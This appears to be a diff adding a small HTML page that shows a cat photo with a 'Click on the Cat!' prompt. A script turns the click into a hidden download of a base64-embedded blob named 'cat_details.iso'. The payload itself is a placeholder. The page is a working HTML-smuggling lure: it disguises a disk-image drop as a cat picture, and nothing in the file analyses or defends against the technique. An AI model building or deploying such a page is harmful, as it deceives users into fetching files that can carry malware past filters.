@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cat Image Download</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; }
+        img { width: 200px; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h3>Click on the Cat!</h3>
+    <img src="https://i.natgeofe.com/n/548467d8-c5f1-4551-9f58-6817a8d2c45e/NationalGeographic_2572187_square.jpg" 
+         alt="Click on the cat to download file" onclick="initiateDownload()" />
+</div>
+
+<script>
+(function() {
+    function b64ToBuf(b64) {
+        var bin = atob(b64), len = bin.length, buf = new Uint8Array(len);
+        for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
+        return buf;
+    }
+
+    window.initiateDownload = function() {
+        var data = 'BASE64';
+        var blobData = b64ToBuf(data);
+        var blob = new Blob([blobData], { type: 'application/octet-stream' });
+        var link = document.createElement('a');
+        link.style.display = 'none';
+        document.body.appendChild(link);
+
+        var url = window.URL.createObjectURL(blob);
+        link.href = url;
+        link.download = 'cat_details.iso'; // Nome do arquivo de download
+        link.click();
+
+        setTimeout(function() {
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(link);
+        }, 100);
+    };
+})();
+</script>
+</body>
+</html>
